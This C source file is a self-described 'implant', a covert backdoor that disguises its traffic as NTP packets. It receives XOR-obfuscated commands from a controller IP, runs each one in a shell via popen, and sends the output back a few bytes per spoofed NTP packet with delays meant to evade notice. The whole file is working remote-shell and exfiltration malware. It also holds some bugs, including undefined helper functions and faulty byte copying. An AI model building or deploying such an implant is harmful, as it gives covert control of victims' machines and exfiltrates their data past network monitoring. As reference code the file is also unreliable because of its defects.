#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


#define DST_PORT 123  // NTP
#define KEY "Bruh"
#define DONE 12345
// Pseudo header for checksum calculation
struct pseudo_header {
    u_int32_t src;
    u_int32_t dst;
    u_int8_t zero;
    u_int8_t proto;
    u_int16_t len;
};

struct ntp_timestamp {
    uint32_t seconds;
    uint32_t fraction;
};



// Checksum calculation
unsigned short checksum(void *vdata, size_t length) {
    char *data = vdata;
    unsigned long sum = 0;
    for (size_t i = 0; i < length - 1; i += 2) {
        unsigned short word = (data[i] << 8) + data[i + 1];
        sum += word;
    }
    if (length & 1) {
        unsigned short word = data[length - 1] << 8;
        sum += word;
    }
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
};



bool waitForCommandFromServer(char command[], char DST_IP[], char SRC_IP[]) {
    char buf[32768];
    printf("Waiting once again\n");
    struct sockaddr_in receiveAddr;
    int saddrLen = sizeof(receiveAddr);
    int recvSock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    bool isDone = false;
    int packetsReceived = 0;
    int finalPacketCount = INT32_MAX;
    while (isDone == 0|| packetsReceived < finalPacketCount) {
        memset(buf, 0, sizeof(buf));
        int dataAmount = recvfrom(recvSock, buf, sizeof(buf), 0,(struct sockaddr *)&receiveAddr, (socklen_t*)&saddrLen);
        if (dataAmount < 0) {
            perror("Your code does not work lol");

        } 

        struct iphdr *iph = (struct iphdr*)buf;
        struct udphdr *udph = (void*) iph + iph->ihl * 4;
        uint8_t* ntpInformation = (uint8_t *)udph + sizeof(struct udphdr);
        char *data = buf + sizeof(struct iphdr) + sizeof(struct udphdr);
        if (iph->protocol == IPPROTO_UDP && ntohs(udph->dest) == 123) {
            // NTP Packet, We know that this is probably coming from our server
            char *address = inet_ntoa(((struct sockaddr_in *)&receiveAddr)->sin_addr);
            

            // If they are not the ip we're looking for (ie an actual NTP server), ignore the packet
            if (strncmp(address, DST_IP, sizeof(address)) == 0) {
                printf("The last packet been sent? %d Packets Received %d Packets Needed %d", isDone, packetsReceived, finalPacketCount);

                printf("Received a packet from %s\n", address);
                print_hex(data + 32, 16);
                uint16_t covertInformation;
                memcpy(&covertInformation + 1, data + 38, sizeof(uint8_t));
                memcpy(&covertInformation, data + 39, sizeof(uint8_t));
                print_binary_uint16(covertInformation);

                // Port is done (15)
                isDone = covertInformation & 0x1;
                uint8_t bytesToRead = ((covertInformation & 0x6) >> 1 ) + 1;
                uint16_t seqNum = (covertInformation & 0xFFFF8) >> 3;

                printf("IsDone? %d bytesToRead: %d, seqNum: %d\n", isDone, bytesToRead, seqNum);

                // Decode Packet
                for (int i = 0; i < bytesToRead; i++) {
                    command[i + seqNum * 4] = KEY[i] ^ data[i + 44];
                }

                if (isDone == true) {
                    finalPacketCount = seqNum;
                    fflush(stdout);
                }

                packetsReceived++;

            }

        }
    }
    


    return true;
}




int main(int argc, char *argv[]) {

    unsigned int deltaBetweenPackets = 0;
    char SRC_IP[16];
    char DST_IP[16];
    // specify time between packets
    if (argc == 4) {
        deltaBetweenPackets = atoi(argv[1]);
        memcpy(SRC_IP, argv[2], 16);
        memcpy(DST_IP, argv[3], 16);
        printf("Changed detla %d Changed IP: %s CHanged DST: %s\n", deltaBetweenPackets, SRC_IP, DST_IP);
    }
    else {
        printf("Usage: ./implant <delta> <SRC_IP> <DST_IP>\n");
        return 1;
    }
    

    char packet[4096];
    memset(packet, 0, 4096);

    struct iphdr *iph = (struct iphdr *) packet;
    struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
   
    time_t unix_time = time(NULL);  // Seconds since 1970
    
    struct ntp_timestamp ntp_seconds = {(uint32_t)(unix_time + 2208988800U), 0};
    
    memcpy(data + 40, &ntp_seconds, sizeof(uint32_t) * 2);

    // Fill in IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 48);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr(SRC_IP); // change to your IP
    iph->daddr = inet_addr(DST_IP);   // target IP
    iph->check = checksum(iph, sizeof(struct iphdr));

    // Fill in UDP header
    udph->source = htons(123); // Part of our Channel
    udph->dest = htons(DST_PORT);
    udph->len = htons(sizeof(struct udphdr) + 48);
    udph->check = 0;

    // Socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == -1) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DST_PORT);
    sin.sin_addr.s_addr = iph->daddr;

    if (sendto(s, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                perror("sendto");
                //printf("errno: %d\n", errno);
                return 1;
            }

    while (1) {
        printf("Enter Command to send output to other end\n");
        char command[2048];
        memset(command, 0, 2048);

        waitForCommandFromServer(command, DST_IP, SRC_IP);
        printf("Finsihed Command query %s\n", command);
        fflush(stdout);
        command[strcspn(command, "\n")] = 0;
        FILE *fp = popen(command, "r");
        if (fp == NULL) {
            perror("Bad command");
            return 1;
        }
        
        char buf[32768];
        memset(buf, 0, 32768);
        char line[1024];
        memset(line, 0, 1024);
        while (fgets(line, sizeof(line), fp) != NULL) {
            printf("%s\n",line);
            fflush(stdout);
            strncat(buf, line, sizeof(buf) - strlen(line) - 1);
        }

        printf("Sending %s\n", &buf[0]);
        int currentIndex = 0;
        while (buf[currentIndex * 4] != '\0') {
            uint16_t finishByte = 0;
            char pack[4];
            memset(pack, 0, 4);
            bool smallPacket = false;
            for (uint8_t i = 0; i < 4; i++) {
                if (buf[currentIndex * 4 + i] == '\0') {
                    finishByte =  0b1 | ((i - 1) << 1) | (currentIndex << 3);
                    udph->source = htons(finishByte);
                    printf("Ending The Message\n");
                    smallPacket = true;
                    break;
                }
                else {
                    pack[i] = KEY[i] ^ buf[currentIndex * 4 + i];
                }
            }

            if (buf[currentIndex * 4 + 4] == '\0' && !smallPacket) {
                uint16_t finishByte = 0b111 | (currentIndex << 3);
                udph->source = htons(finishByte);                        
            }
            else if (!smallPacket) {
                finishByte |= 0b110 | (currentIndex << 3);
                udph->source = htons(finishByte);
            }
            

            memcpy(data + 44, &pack, sizeof(uint32_t));
            
            if (sendto(s, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                perror("sendto");
                return 1;
            }
            currentIndex++;

            sleep(deltaBetweenPackets);
        }
        printf("Message Sent, Total Packets: %d\n", currentIndex);
    }
    close(s);
    return 0;
}
